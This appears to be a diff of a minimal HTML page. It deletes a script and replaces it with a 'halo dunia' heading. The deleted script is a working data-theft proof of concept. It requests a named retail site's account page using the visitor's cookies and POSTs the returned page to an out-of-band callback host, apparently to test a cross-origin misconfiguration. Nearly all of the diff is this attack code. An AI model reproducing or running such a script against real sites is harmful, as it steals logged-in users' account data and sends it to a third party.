@@ -6,21 +6,6 @@
   <title>Document</title>
 </head>
 <body>
-<script>
-  fetch('https://ae.loccitane.com/en/account',{
-    method:'GET',
-    credentials:'include'
-}).then (respon => {
-    if (respon.ok) {
-        return respon.text()
-    }
-}).then(data=>{
-    const xhr=new XMLHttpRequest();
-    xhr.open("POST","https://zwnlomqbjkmtvqefkotxq7wa2azmh2qn7.oast.fun",true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    const hasil = "result="+encodeURIComponent(data);
-    xhr.send(hasil)
-})
-</script>
+<h1>halo dunia</h1>
 </body>
 </html>
